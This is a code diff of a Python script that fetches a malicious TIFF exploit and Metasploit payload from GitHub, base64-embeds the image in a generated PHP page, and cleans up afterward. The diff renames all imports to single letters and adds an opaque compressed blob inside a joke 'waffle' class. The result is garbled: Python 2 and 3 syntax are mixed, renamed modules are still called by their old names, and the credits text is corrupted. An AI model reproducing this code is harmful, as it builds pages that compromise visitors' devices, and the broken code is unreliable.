@@ -1,10 +1,150 @@
-import base64 #Used to append the image to the php file
-import pickle #Used to create storage files that store hex data
-import os #Used for File deleting and if exists functions and renaming files and even exit codes
-import binascii #Used to read back hex data and append hex data
-import urllib3 #Used to download the payload.bin file and the exploit.bin file
-import pathlib #Used to obtain the current path
-import random #Used to generate chunk sizes
+import base64 as i
+import binascii as l
+import logging as f
+import os as j
+import pathlib as q
+import pickle as m
+import random as n
+import requests as g
+import sentry_sdk as e
+import struct as a
+import sys as s
+import time as r
+import urllib3 as o
+import zlib as p
+from sentry_sdk.integrations.logging import LoggingIntegration
+g.packages.urllib3.disable_warnings()  # This is so we don't get some warning about SSL.
+production = False
+p_errors = False
+def setup_log(sentry_url, print_errors):
+    global logger, production
+    sentry_logging = LoggingIntegration(
+        level=f.INFO,
+        event_level=f.INFO
+    )
+    e.init(dsn=sentry_url, integrations=[sentry_logging])
+    logger = logging.getLogger(__name__)
+    p_errors = print_errors
+    production = True
+def log(msg, level):  
+    # TODO: Use number levels, strings are annoying
+    if p_errors:
+        print(msg)
+    if production:
+        if level == "VERBOSE":
+            logger.debug(msg)
+        elif level == "INFO":
+            logger.info(msg)
+        elif level == "WARNING":
+            logger.warning(msg)
+        elif level == "CRITICAL":
+            logger.critical(msg)
+def u8(b):
+    if not 0 <= b <= 255:
+        log("u8 out of range: %s" % b, "INFO")
+        b = 0
+    return a.pack(">B", b)
+def u16(b):
+    if not 0 <= b <= 65535:
+        log("u16 out of range: %s" % b, "INFO")
+        b = 0
+    return a.pack(">H", b)
+def u32(b):
+    if not 0 <= b <= 4294967295:
+        log("u32 out of range: %s" % b, "INFO")
+        b = 0
+    return a.pack(">I", b)
+def pad(c):
+    d = ""
+    for _ in range(c): d += "\0"
+    return d
+class WaffleBatter:
+	def __init__(self):
+		self.cooking_time = 100
+		self.batter = "eNp9VbGu3DgM7PMVhBs2sq4VDnHKwxUu1DLehQhBxeukD7iPvyEl78tLXuJisbbJ4Qw5lIn+dJUfri+/i+n92Lbr70siblreWFLejtE/zQhHZpW4C+OGW0pKoWuOUvVb6VlG/DUtJAsO8tC3SGFkpvKUy19xyO0ynlHl54LhYEIpteTnyOmiIcwa9BHLGIzHWvFSN0D+lFwaFzyM2ks4NjaKdb04NujEPWe8NTV4SPohvSWvSe3IUsn4kkQ5V3DRt+JtQyNq7GiEUpT+nt84SnSZqBOtq+SqpZsAoq1K97fPEbWWCcUSXwjJyBvNoR7+rN3lht1nRNDEF2r7DIRTR3+RsT/PBRFsini0VHsPEL9bUSXAOTeBqO59RrDWv1yz1IkRKHXtVhVqJt0ydoz5VV9i9oxHTIYXEGz9tri8QKSZV8gfmcLggEqcJoO2nXcGXyR9ekL4uymiuyM50QNsDnYOdU0SrMHhnBy2iQgcmEPOd1GReXG5xB/JuQ9vG8LmiNpe50SDVZA+Z6/fIOsfG5K4jeRGuWwO8SbRsC3nPkkILVkHyySxLHzu8335niZKdeOidXST6IvDXI+bBHo/IdH6OjtpJNN/q720zAVjypwuZTcqhMK3j5ni7QWLr+zCzU4Mh9E9JarAcYc1GLKvPQHkGZ2crdlj/rUdfsyazZcTOXQtGI0ko3icBvh+/i19sUBOzbYxE/PUat1BEEV9a9xu+yN6Ns/W/sgJ22pGz07NpZUR7wjQ0OprQsoNp8lricDGqfpUL7o5KHc7SYrJNa9Emizkkr62l95ByOas/16rh+8zIHqpIiCCzuDbVrFl+oHIlGTxy97LJjgL8vJRGPOIKjciEEDkw3E4+649OhcIOpdRw8TzJt0qnOFHDi8IMMFpqTDUrFeC7ebJd+2Y5tQB+OsHQPrkyPaB6OksLkWEzb6lhIH5ONLIn309dBt31whH+WbXvtsv803g07orZaNeyudfMRx2v81bk9d9H/vr6mNX5i//A5YHk94="
+class Waffle:
+	def __init__(self, waffle):
+		self.waffle = waffle
+	def display(self, file=s.stdout):
+		file.write(self.waffle)
+class WaffleIron:
+	def __init__(self):
+		self.power = False
+		self.time = 0
+		self.full = False
+		self.contents = False
+		pass
+	def switchPower(self, power):
+		self.power = power
+	def fill(self, contents):
+		if not self.power:
+			raise RuntimeError("Turn on the iron first!")
+		if not isinstance(contents, WaffleBatter):
+			raise ValueError("Iron can only be filled with batter!")
+		self.contents = contents
+		self.time = r.time()
+		return self.contents.cooking_time
+	def contentsAreCooked(self):
+		return r.time() > (self.time+self.contents.cooking_time)
+	def getTimeLeft(self):
+		return max(0,(self.time+self.contents.cooking_time) - r.time())
+	def getContents(self):
+		if self.contentsAreCooked():
+			batter = self.contents.batter
+			cookedbatter = p.decompress(i.b64decode(batter))
+			self.contents = Waffle(cookedbatter)
+		else:
+			raise RuntimeError("Waffle is not yet cooked!")
+		return self.contents
+class BreakfastType:
+	def __init__(self):
+		raise NotImplementedError("BreakfastType is abstract")
+class Waffles(BreakfastType):
+	def __init__(self):
+		pass
+	def make(self):
+		batter = WaffleBatter()
+		iron = WaffleIron()
+		iron.switchPower(True)
+		cooktime = iron.fill(batter)
+		cm, cs = divmod(cooktime,60)
+		if cm > 0:
+			print "Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1))
+		else:
+			print "Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1))
+		while not iron.contentsAreCooked():
+			left = iron.getTimeLeft()
+			m,s = divmod(left+0.99,60)
+			s.stdout.write("%02d:%02d"%(m,s))
+			s.stdout.flush()
+			r.sleep(0.5)
+			s.stdout.write("\x08"*5)
+			s.stdout.flush()
+		print
+		waffle = iron.getContents()
+		iron.switchPower(False)
+		return waffle
+class BreakfastMaker:
+	preferredBreakfasts = {'bushing':Waffles}
+	def __init__(self):
+		pass
+	def makeBreakfastFor(self, user):
+		if not user in self.preferredBreakfasts:
+			raise ValueError("I don't know how to make breakfast for %s!"%user)
+		maker = self.preferredBreakfasts[user]
+		breakfast = maker().make()
+		return breakfast
+def startbreakfast():
+  print "Breakfast Maker v0.2"
+  user = raw_input("Please enter your username: ")
+  maker = BreakfastMaker()
+  print "Making breakfast for %s..."%user
+  breakfast = maker.makeBreakfastFor(user)
+  print
+  print "Your breakfast is ready!"
+  print
+  breakfast.display()
+  print "\a"
 def check(num):
   num2 = int(num)
   if (num2 % 2) == 0:
@@ -15,8 +155,8 @@ def check(num):
     print("{0} is Odd".format(num2))
     data = "odd"
     return data
-def exploit(offset, secondary):
-  if offset == 0:
+def exploit(k, secondary):
+  if k == 0:
     if secondary == 1: #No Pre-Existing Mode
       pre(0)
       task(2)
@@ -28,99 +168,99 @@ def exploit(offset, secondary):
       os._exit(0)
     elif secondary == 4: #Re-generate Credits File mode
       credits(0)
-  elif offset == 1:
+  elif k == 1:
     # Open in binary mode (so you don't read two byte line endings on Windows as one byte)
     # and use with statement (always do this to avoid leaked file descriptors, unflushed files)
     with open('exploit.tiff', 'rb') as f:
         # Slurp the whole file and efficiently convert it to hex all at once
-        hexdata = binascii.hexlify(f.read())
-        pickle.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
-  elif offset == 2:
-    data2 = str(pathlib.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
+        hexdata = l.hexlify(f.read())
+        m.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
+  elif k == 2:
+    data2 = str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
     url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
     downloadtask(data2, url2)
-  elif offset == 3:
-    data1 = str(pathlib.Path(__file__).parent.absolute()) + "/" + "payload.bin"
+  elif k == 3:
+    data1 = str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
     url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
     downloadtask(data1, url1)
-  elif offset == 4:
+  elif k == 4:
     credits(1)
-  elif offset == 5:
-    if os.path.exists("payload.bin"):
-      os.remove("payload.bin")
-  elif offset == 6:
-    if os.path.exists("hex.dat"):
-      os.remove("hex.dat")
-  elif offset == 7:
-    if os.path.exists("exploit.tiff"):
-      os.remove("exploit.tiff")
-  elif offset == 8:
-    if os.path.exists("exploit.bin"):
-      os.remove("exploit.bin")
-  elif offset == 9:
-    if os.path.exists("exploit.php"):
-      os.remove("exploit.php")
+  elif k == 5:
+    if j.path.exists("payload.bin"):
+      j.remove("payload.bin")
+  elif k == 6:
+    if j.path.exists("hex.dat"):
+      j.remove("hex.dat")
+  elif k == 7:
+    if j.path.exists("exploit.tiff"):
+      j.remove("exploit.tiff")
+  elif k == 8:
+    if j.path.exists("exploit.bin"):
+      j.remove("exploit.bin")
+  elif k == 9:
+    if j.path.exists("exploit.php"):
+      j.remove("exploit.php")
   else:
     exploit(0)
 def run():
   load_file = open('hex.dat', 'rb')
-  f = pickle.load(load_file)
+  f = m.load(load_file)
   with open('exploit.bin', 'wb') as fout:
     fout.write(
-      binascii.unhexlify(f)
+      l.unhexlify(f)
     )
   exploit(6, 0)
   data = open('exploit.bin', 'rb').read()
-  bytes_base64 = base64.b64encode(data)
+  bytes_base64 = i.b64encode(data)
   text_base64 = bytes_base64.decode()
   html = '<?php\n$htmlcode = "<img src=\\"data:image/png;base64,' + text_base64 + '\\">";\necho $htmlcode\n?>'
   open('exploit.php', 'w').write(html)
   exploit(7, 0)
   exploit(8, 0)
   return html
-def pre(mainoffset):
-  if mainoffset == 0:
+def pre(maink):
+  if maink == 0:
     task(1)
     task(0)
     data = int(0)
     return data
-  elif mainoffset == 1:
+  elif maink == 1:
     task(1)
     data = int(0)
     return data
-  elif mainoffset == 2:
+  elif maink == 2:
     exploit(5, 0)
     task(0)
-    data = "MSG:" + " " + str(pathlib.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
+    data = "MSG:" + " " + str(q.Path(__file__).parent.absolute()) + " " + "DOWNLOADED!"
     return data
-def credits(othroffset):
+def credits(othrk):
     a = "credits:\n"
     b = a + "base64 implmentation by fmw42\n"
     c = b + "hex implementation by falsetru\n"
     d = c + "file to hex implementation by ShadowRanger\n"
-    e = d + "urllib3 downloading implementation by shazrow\n"
+    e = d + "o downloading implementation by shazrow\n"
     f = e + "exploit.bin based on exploit.tiff by planetbeing\n"
-    if othroffset == 0:
+    if othrk == 0:
       h = open("CREDITS.txt", "a")
       h.write(f)
       h.close()
-    elif othroffset == 1:
+    elif othrk == 1:
       print(f)
-def task(miscoffset):
-  if miscoffset == 0:
+def task(misck):
+  if misck == 0:
     exploit(2, 0)
     exploit(1, 0)
-  elif miscoffset == 1:
+  elif misck == 1:
     exploit(5, 0)
     exploit(4, 0)
     exploit(3, 0)
-  elif miscoffset == 2:
+  elif misck == 2:
     run()
     os._exit(0)
 def downloadtask(data, url):
-  http = urllib3.PoolManager()
+  http = o.PoolManager()
   r = http.request('GET', url, preload_content=False)
-  chunk_size = random.randint(10, 1000)
+  chunk_size = n.randint(10, 1000)
   with open(data, 'wb') as out:
     while True:
       data = r.read(chunk_size)
